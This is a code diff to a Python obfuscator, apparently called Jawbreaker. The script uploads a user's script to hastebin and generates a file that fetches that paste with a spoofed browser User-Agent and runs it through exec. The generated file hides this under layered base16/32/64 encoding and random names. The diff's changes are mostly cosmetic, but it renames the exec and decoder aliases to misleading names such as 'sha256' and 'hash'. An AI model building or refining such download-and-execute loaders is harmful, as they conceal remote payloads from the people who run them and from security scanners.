@@ -39,17 +39,24 @@ ignore = ("b16encode", "b32encode", "b64encode")
 
 class Col:
     colors = {"red" : "\033[38;2;255;0;0m", 
-              "green" : "\033[38;2;0;255;0m", 
-              "cyan" : "\033[38;2;125;125;255m",
+              "gray" : "\033[38;2;150;150;150m", 
+              "darkgray" : "\033[38;2;100;100;100m", 
               "white" : "\033[38;2;255;255;255m"}
 
     red = colors['red']
 
-    green = colors['green']
+    gray = colors['gray']
 
-    cyan = colors['cyan']
+    darkgray = colors['darkgray']
 
     white = colors['white']
+
+        
+    def printf(text):
+        print(Col.darkgray + text)
+
+
+
 
 class Create():
         def __init__(self):
@@ -74,16 +81,16 @@ jawbreaker = """
 
 author = "  # # # {} # # #".format(b64decode("YmlsbHl0aGVnb2F0MzU2").decode('utf-8'))
 
-print(Fade.Vertical(Colors.blue_to_cyan, center(jawbreaker)))
-print(Fade.Horizontal(Colors.cyan_to_green, center(author)))
+print(Fade.Vertical(Colors.white_to_black, center(jawbreaker)))
+print(Fade.Horizontal(Colors.black_to_white, center(author)))
 
 print("\n")
 
 if len(argv) > 1:
     file = argv[1]
-    print(Col.green+"Enter file name > "+Col.white+file)
+    print(Col.gray+"Enter file name > "+Col.white+file)
 else:
-    file = input(Col.green+"Enter file name > "+Col.white)
+    file = input(Col.gray+"Enter file name > "+Col.white)
 
 if not isfile(file):
     print()
@@ -92,14 +99,14 @@ if not isfile(file):
 
 if len(argv) > 2:
     output = argv[2]
-    print(Col.green+"Enter name of output file > "+Col.white+output)
+    print(Col.gray+"Enter name of output file > "+Col.white+output)
 else:
-    output = input(Col.green+"Enter name of output file > "+Col.white)
+    output = input(Col.gray+"Enter name of output file > "+Col.white)
 
 
     
 print()
-print("\nBuilding obfuscated file...\n")
+Col.printf("\nBuilding obfuscated file...\n")
 
 defined = []
 
@@ -107,27 +114,28 @@ def nfile(file:object, only:bool=False) -> tuple:
     
     temp_names = ["exec", "b16decode", "b32decode", "b64decode"] if only else [name for name in globals_names]
 
-    print("Defining globals variables...")
+    Col.printf("Defining globals variables...")
 
     for name in temp_names:
         random_name = random()
         if name == "exec":
-            exc = random_name
+            exc = random_name = "sha256"
         elif name == "b16decode":
+            b16 = random_name = "hash"
             file.write(f"from base64 import b16decode as {random_name};")
             b16 = random_name
             continue
         elif name == "b32decode":
+            b32 = random_name = "b16"
             file.write(f"from base64 import b32decode as {random_name};")
-            b32 = random_name
             continue
         elif name == "b64decode":
+            b64 = random_name = "xor"
             file.write(f"from base64 import b64decode as {random_name};")
-            b64 = random_name
             continue
         elif name in ignore:
             continue
-        file.write(f"{random_name} = {name};")
+        file.write(f"{random_name}={name};")
     return exc, b16, b32, b64
 
 def random(l:int=2) -> str:
@@ -143,10 +151,10 @@ def build():
     with open(file, 'r', encoding=encoding) as f:
         content = f.read()
 
-    print("Creating hastebin...")
+    Col.printf("Creating hastebin...")
     key = post("https://hastebin.com/documents", data=content.encode('utf-8')).json()["key"]
     url = "https://hastebin.com/raw/" + key
-    print(f"Hastebin created! Url: {url}.")
+    Col.printf(f"Hastebin created! Url: {url}.")
 
 
     file_1 = Create()
@@ -156,20 +164,20 @@ def build():
     urlp = random()
     req = random()
 
-    print("Importing HTTP requests lib...")
+    Col.printf("Importing HTTP requests lib...")
     file_1.write(f"from urllib.request import urlopen as {urlp}, Request as {req};")
 
     chars_list = random()
-    print("Creating content list...")
+    Col.printf("Creating content list...")
     file_1.write(f"{chars_list}=[];")
     content = f"""{exc}({urlp}({req}("{url}", headers={{"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}})).read())"""
 
-    print("Encoding content...")
+    Col.printf("Encoding content...")
     content = b16encode(b32encode(b64encode(content.encode(encoding)))).decode(encoding)
 
     random_chars_list = []
 
-    print("Building content list...")
+    Col.printf("Building content list...")
 
     for char in content:
         random_char = random()
@@ -183,10 +191,10 @@ def build():
         file_1.write(f"{random_append_function}({random_char});")
 
     content_name = random()
-    print("Creating variable to be desobfuscated...")
+    Col.printf("Creating variable to be desobfuscated...")
     file_1.write(f"{content_name} = ''.join({chars_list});")
 
-    print("Building desobfuscator...")
+    Col.printf("Building desobfuscator...")
     file_1.write(f"{exc}({b64}({b32}({b16}({content_name}))));")
 
 
@@ -201,14 +209,17 @@ def build():
 
     exc, b16, b32, b64 = nfile(file_2)
 
-    print("Building second desobfuscator...")
+
+    Col.printf("Building second desobfuscator...")
+
+
 
     file_2.write(f'{exc}({b64}({b32}({b16}("{content}"))));')
 
-    print("\nCreating final content...")
+    Col.printf("\nCreating final content...")
     content = file_2.content
 
-    print("Writing content...")
+    Col.printf("Writing content...")
 
     with open(output, 'w', encoding=encoding) as f:
         f.write(content)
@@ -218,6 +229,6 @@ def build():
 try:
     build()
     print("\n")
-    input(Col.cyan+"Done!"+Col.white)
+    input(Col.gray+"Done!"+Col.white)
 except Exception as e:
     input(Col.red+"Error! [{}]".format(e)+Col.white)
